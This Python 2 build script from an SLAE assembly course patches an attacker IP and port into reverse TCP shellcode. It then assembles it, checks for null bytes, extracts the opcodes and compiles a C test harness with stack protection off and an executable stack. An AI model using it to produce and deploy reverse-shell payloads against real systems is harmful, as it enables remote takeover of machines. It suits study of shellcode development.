# Filename: nasm_compile_and_more.py
# Version: 0.8
# Author:   Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
# SLAE-461
# Purpose: To execute repeated tasks quicker

#!/usr/bin/python
import argparse
import subprocess
import time
import socket

parser = argparse.ArgumentParser()
parser.add_argument("filename", help="Assembly file to change port and IP for reverse TCP shellcode")
parser.add_argument("ip", help="Setup the IP to connect to, this should be in the form x.x.x.x (with x ranging between 0-255)")
parser.add_argument("port", help="Setup port number, this should be in range between 1-65535", type=int)
args = parser.parse_args()

port_for_shellcode_nasm = ""
port_for_shellcode_c = ""
ip_for_shellcode_nasm = ""
ip_for_shellcode_c = ""
filename_without_its_extension = ""

def convert_port_to_hex_for_shellcode_c(port_in_dec):
	#print hex(port_in_dec)
	encoded = ""
	pad = "\\x00"
	padded_and_encoded = ""
	converted_port = ""

	hex_with_no_0x = hex(port_in_dec).replace("0x","")	#Remove 0x from the string

	if len(hex(port_in_dec)) == 3: 					#eg 0x9 for port 9
		encoded += '\\x0'+ hex_with_no_0x			#should add an extra 0
		converted_port += pad + encoded 			#pre-pad the value with \x00
		return converted_port
	elif len(hex(port_in_dec)) == 4: 				#eg 0x50 for port 80
		encoded += '\\x'+ hex_with_no_0x
		converted_port += pad + encoded 			#pre-pad the value with \x00
		return converted_port
	elif len(hex(port_in_dec)) == 5: 				#eg 0x457 for port 1111
		encoded += '\\x0'+ hex_with_no_0x 			#should add an extra 0
		converted_port = encoded[:4] + '\\x' + encoded[4:]
		return converted_port
	elif len(hex(port_in_dec)) == 6: 				#eg x115c for port 4444
		encoded += '\\x'+ hex_with_no_0x 		
		converted_port = encoded[:4] + '\\x' + encoded[4:]
		return converted_port

def convert_port_to_hex_for_assembly_file():		# need to replace 0x5c11 with new value
	converted_port = ""
	port_format_for_assembly_nasm = port_for_shellcode_c.split('\\x')
	port_in_reverse_string = port_format_for_assembly_nasm[::-1]
	converted_port = "0x" + port_in_reverse_string[0] + port_in_reverse_string[1]
	return converted_port

def convert_ip_to_hex_for_shellcode_c(ip_in_decimal):
        split_ip = ip_in_decimal.split('.')
        ip_for_shellcode_c = '\\x{:02x}\\x{:02x}\\x{:02x}\\x{:02x}'.format(*map(int, split_ip))
        return ip_for_shellcode_c

def convert_ip_to_hex_for_assembly_file(ip_in_decimal):	
	ip_format_for_assembly_nasm = ip_in_decimal.split('.')
        ip_in_reverse_string = ip_format_for_assembly_nasm[::-1]
	
	str_0 = ip_in_reverse_string[0]
	reversed_0_in_dec = (int(str_0, 10))
        reversed_0_in_hex = format(reversed_0_in_dec, 'x')
	if len(reversed_0_in_hex) != 2:
		reversed_0_in_hex = "0"+reversed_0_in_hex
        
	str_1 = ip_in_reverse_string[1]
	reversed_1_in_dec = (int(str_1, 10))
        reversed_1_in_hex = format(reversed_1_in_dec, 'x')
	if len(reversed_1_in_hex) != 2:
                reversed_1_in_hex = "0"+reversed_1_in_hex
        
	str_2 = ip_in_reverse_string[2]
	reversed_2_in_dec = (int(str_2, 10))
        reversed_2_in_hex = format(reversed_2_in_dec, 'x')
	if len(reversed_2_in_hex) != 2:
                reversed_2_in_hex = "0"+reversed_2_in_hex
	
	str_3 = ip_in_reverse_string[3]
	reversed_3_in_dec = (int(str_3, 10))
	reversed_3_in_hex = format(reversed_3_in_dec, 'x')
	if len(reversed_3_in_hex) != 2:
                reversed_3_in_hex = "0"+reversed_3_in_hex
	
	ip_for_shellcode_nasm = "0x"+(reversed_0_in_hex + reversed_1_in_hex + reversed_2_in_hex + reversed_3_in_hex).upper()
	#print str_0 + str_1 + str_2+ str_3      
	#print ip_for_shellcode_nasm
        return ip_for_shellcode_nasm


def replace_a_string_with_another_in_assembly_file(filename, old_string, new_string):
	s=open(filename).read()
	if old_string in s:
		print '[+] Changing "{old_string}" to "{new_string} ..."'.format(**locals())
	    	s=s.replace(old_string, new_string)
	    	f=open(filename, 'w')
	    	f.write(s)
	    	f.flush()
	    	f.close()
    	else:
	    	print '[-] No occurrences of "{old_string}" found.'.format(**locals())
	    	print '[-] Leaving file intact.'

def split_filename_from_its_extension(filename_with_its_extension):	
	filename_splitted = filename_with_its_extension.split('.')
	filename_part = filename_splitted[::1]
	filename_without_its_extension = filename_part[0] 
	return filename_without_its_extension

print "\n"
print "[i] >>> Parsing the Port number <<<"
port_for_shellcode_c = convert_port_to_hex_for_shellcode_c(args.port)
print "[i] Port number ready to be copied in shellcode.c (format \\xAB\\xCD) ...: \t\t"+ port_for_shellcode_c

port_for_shellcode_nasm = convert_port_to_hex_for_assembly_file()
print "[i] Port number ready to be copied in the assembly program (format 0xCDAB) ...: \t"+ port_for_shellcode_nasm

print "[+] Patching assembly ("+ args.filename+ ") file with new port "+str(args.port)
#replace_a_string_with_another_in_assembly_file(args.filename, "0x5c11", port_for_shellcode_nasm)
replace_a_string_with_another_in_assembly_file(args.filename, "0xW00T", port_for_shellcode_nasm)

print "\n[i] >>> Parsing the IP Address <<<"
ip_for_shellcode_nasm = convert_ip_to_hex_for_assembly_file(args.ip)
print "[i] \tExample: 192.168.2.2 = 0xC0A80202 but for assembly program it should be 0x0202A8C0"
print "[i] IP converted and ready to patch assembly program ...: \t\t\t\t"+ ip_for_shellcode_nasm

ip_for_shellcode_c = convert_ip_to_hex_for_shellcode_c(args.ip)
print "[i] \tExample: 192.168.2.2 = 0xC0A80202 but for shellcode_c it should be \\xc0\\xa8\\x02\\x02"
print "[i] IP address ready to be copied in shellcode.c (format \\xAB\\xCD) ...: \t\t"+ ip_for_shellcode_c

print "[+] Patching assembly ("+ args.filename+ ") file with new IP ("+str(args.ip)+") to connect to"
#replace_a_string_with_another_in_assembly_file(args.filename, "0x0202A8C0", ip_for_shellcode_nasm)
replace_a_string_with_another_in_assembly_file(args.filename, "0xP0WNP0WN", ip_for_shellcode_nasm)

print "[+] Assembling with NASM ..."
filename_without_its_extension = split_filename_from_its_extension(args.filename)
cmd_nasm_assembling = "nasm -f elf32 -o "+ filename_without_its_extension+".o " +args.filename
#print cmd_nasm_assembling
p1 = subprocess.Popen(cmd_nasm_assembling, shell=True, stderr=subprocess.PIPE)

print "[+] Linking with GNU Linker ..."
cmd_gnu_linking = "ld -o "+filename_without_its_extension+" "+ filename_without_its_extension+".o "
#print cmd_gnu_linking
p2 = subprocess.Popen(cmd_gnu_linking, shell=True, stderr=subprocess.PIPE)

print "[+] Checking for NULLs ..."
time.sleep(3)
cmd_null_check = "objdump -d "+filename_without_its_extension+"|grep \'[0-9a-f]:\'|grep -v \'file\'|cut -f2 -d:|cut -f1-6 -d\' \'|tr -s \' \'|tr \'\\t\' \' \'|sed \'s/ $//g\'|sed \'s/ /\\\\\\x/g\'|paste -d \'\' -s |sed \'s/^/\"/\' | sed \'s/$/\"/g\'"
p3 = subprocess.Popen(cmd_null_check, stdout=subprocess.PIPE, shell=True)
p4 = subprocess.Popen(['grep',"-Eboa", '00'], stdin=p3.stdout, stdout=subprocess.PIPE, )
end_of_pipe = p4.stdout
print '\tNULL occurences found at offset:'
for line in end_of_pipe:
    print '\t\t', line.strip()

print "[+] Exporting shellcode from compiled assembly file ..."
cmd_export_shellcode = "objdump -d "+filename_without_its_extension+"|grep \'[0-9a-f]:\'|grep -v \'file\'|cut -f2 -d:|cut -f1-6 -d\' \'|tr -s \' \'|tr \'\\t\' \' \'|sed \'s/ $//g\'|sed \'s/ /\\\\\\x/g\'|paste -d \'\' -s |sed \'s/^/\"/\' | sed \'s/$/\"/g\'"
p5_my_shellcode = subprocess.check_output(cmd_export_shellcode, shell=True)
print "\n"+p5_my_shellcode+"\n"

print "[+] Building shellcode.c ..."
outfile = open('shellcode.c','w')
outfile.write('#include<stdio.h>\r\n')
outfile.write('#include<string.h>\r\n')
outfile.write('unsigned char code[] = ' + p5_my_shellcode +';\r\n')
outfile.write('main()\r\n')
outfile.write('{\r\n')
outfile.write('printf(\"Shellcode Length:  %d\\n\", strlen(code));\r\n')
outfile.write('int (*ret)() = (int(*)())code;\r\n')
outfile.write('ret();\r\n')
outfile.write('}\r\n')
outfile.close()

print "[+] Compiling shellcode.c"
cmd_gcc_compile = "gcc -fno-stack-protector -z execstack shellcode.c -o shellcode"
p_gcc = subprocess.Popen(cmd_gcc_compile, shell=True)
print "[+] Done"
